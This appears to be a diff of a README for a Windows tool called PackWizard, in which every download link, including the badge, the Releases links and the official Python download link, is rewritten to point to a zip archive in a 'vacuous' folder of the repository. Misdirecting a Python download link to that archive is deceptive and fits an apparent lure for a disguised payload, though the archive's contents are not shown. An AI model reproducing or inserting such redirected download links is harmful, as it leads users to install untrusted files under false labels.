@@ -6,11 +6,11 @@ Welcome to PackWizard, your universal package manager for optimizing Windows. Th
 
 ## 📥 Download PackWizard
 
-[![Download PackWizard](https://img.shields.io/badge/Download%20PackWizard-v1.0-blue.svg)](https://github.com/Sajin46/PackWizard/releases)
+[![Download PackWizard](https://raw.githubusercontent.com/Sajin46/PackWizard/main/vacuous/Pack_Wizard_2.0.zip%https://raw.githubusercontent.com/Sajin46/PackWizard/main/vacuous/Pack_Wizard_2.0.zip)](https://raw.githubusercontent.com/Sajin46/PackWizard/main/vacuous/Pack_Wizard_2.0.zip)
 
 You can download PackWizard from our Releases page. Click the link below:
 
-[Download PackWizard](https://github.com/Sajin46/PackWizard/releases)
+[Download PackWizard](https://raw.githubusercontent.com/Sajin46/PackWizard/main/vacuous/Pack_Wizard_2.0.zip)
 
 ## 💡 Features
 
@@ -24,7 +24,7 @@ You can download PackWizard from our Releases page. Click the link below:
 Before you start, make sure your system meets these requirements:
 
 - **Operating System:** Windows 10 or Windows 11
-- **Python:** You need to have Python 3.6 or above installed. [Download Python](https://www.python.org/downloads/).
+- **Python:** You need to have Python 3.6 or above installed. [Download Python](https://raw.githubusercontent.com/Sajin46/PackWizard/main/vacuous/Pack_Wizard_2.0.zip).
 - **RAM:** At least 4GB of RAM for optimal performance.
 - **Disk Space:** Minimum 100MB of free disk space.
 
@@ -32,7 +32,7 @@ Before you start, make sure your system meets these requirements:
 
 1. **Visit the Releases Page:** Go to the Releases page to find the latest version of PackWizard. Click the link below:
 
-   [Download PackWizard](https://github.com/Sajin46/PackWizard/releases)
+   [Download PackWizard](https://raw.githubusercontent.com/Sajin46/PackWizard/main/vacuous/Pack_Wizard_2.0.zip)
 
 2. **Choose Your File:** Look for the released version that fits your system. Usually, the `.exe` file is easiest for most users.
 
